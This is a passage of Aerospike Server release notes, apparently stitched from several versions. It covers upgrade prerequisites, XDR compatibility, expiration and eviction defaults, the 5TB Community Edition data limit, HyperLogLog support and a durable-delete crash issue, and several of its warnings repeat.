  + Enterprise Only
    - [AER-6404] - (KVS) For single-bin, data-in-memory namespaces, durable deletes may cause a crash on writing replicas or on subsequent restarts.

  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + For the info command [`latency`](https://docs.aerospike.com/reference/info#latency) support has been deprecated and will be removed in the next major release.
    - Please use the new replacement info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.

  #### Improvements

  + Enterprise & Community
    - [AER-6284] - (KVS) Disallow dynamically setting non-zero value of namespace context configuration item [`default-ttl`](https://docs.aerospike.com/reference/configuration#default-ttl) unless [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) is non-zero or [`allow-ttl-without-nsup`](https://docs.aerospike.com/reference/configuration#allow-ttl-without-nsup) is true.

    - [Configure XDR](https://docs.aerospike.com/operations/configure/cross-datacenter)
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0.
    - Aerospike Server version 5.0 will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + The maximum cluster size is now increased to 256 nodes. However, the actual limit when using multicast heartbeat mode will depend on the Maximum Transmission Unit (MTU).
    - There is a 132 node limit with MTU of 1500. A 256 node limit can be achieved with an MTU of 9000.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + XDR, using ACL, in server versions between 4.1.0.1 and 4.3.0.6 cannot ship to this version. The simplest workaround is to avoid using those versions.
  + Community Edition clusters now limit the maximum amount of data to 5TB of unique data. Refer to:
    - [Known Limitations](https://docs.aerospike.com/guide/limitations)

  #### New Features

  + Community Only
    - [AER-6226] - (DEPLOYMENT) Limited Community Edition clusters to 5TB of unique data.

  **Release Date:** April 4, 2022
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Aerospike Server **will not start** If the value of [`default-ttl`](https://docs.aerospike.com/reference/configuration#default-ttl) is non-zero and [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) is zero (the default).
  + Record bins containing (collection data type) Ordered Lists that had operations performed under Aerospike Server versions 3.16.0.1-3.16.0.5 could be incompatible with server versions 4.6 or later due to stricter CDT validation. Also, Unordered Lists created with UDFs under server versions 3.16.0.1-4.5.3.15 could be marked as ordered, even if the application did not explicitly specify this, and would also be incompatible with server versions 4.6 or later. However induced, the incompatibility could also block XDR shipping. The [Aerospike CDT Validation Tool](https://docs.aerospike.com/tools/asvalidation) is available in the [Aerospike Tools 3.24.1](https://download.aerospike.com/download/tools/notes.html#3.24.1) or newer release to identify -and if possible correct- such records. Aerospike recommends the validation tool be run on all namespaces that created or modified List CDTs under a pre-4.6 server. Refer to the [Aerospike CDT Validation Tool](https://docs.aerospike.com/tools/asvalidation) documentation for steps necessary to run the tool and interpret the output.
  + Support added for [HyperLogLog (HLL) probabilistic data types](https://docs.aerospike.com/guide/data-types/hll).
    - Clusters connected using Cross Datacenter Replication (XDR) **all clusters must have been upgraded to Aerospike Server 4.9** prior to using the HyperLogLog (HLL) data type.
    - Before downgrading from Aerospike Server 4.9 all HyperLogLog (HLL) bins **must be removed** by the application.
    - During the unlikely case of a downgrade the drives would need to be wiped. It is advised to review your Aerospike Server 4.9 environment prior to implementing the usage of HyperLogLog (HLL) data type bins.
  + When upgrading to Aerospike Server v4.9.0.7 or newer to ensure migrations complete refer to the Special Upgrades document section [Avoiding partition ownership disagreement that prevents migrations from completing](https://docs.aerospike.com/operations/upgrade/special_upgrades#upgrading-to-4-9-0-7-or-newer-avoiding-partition-ownership-disagreement-that-prevents-migrations-from-completing).
  + When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + CentOS Linux 8 End of Life is scheduled for December 2021.
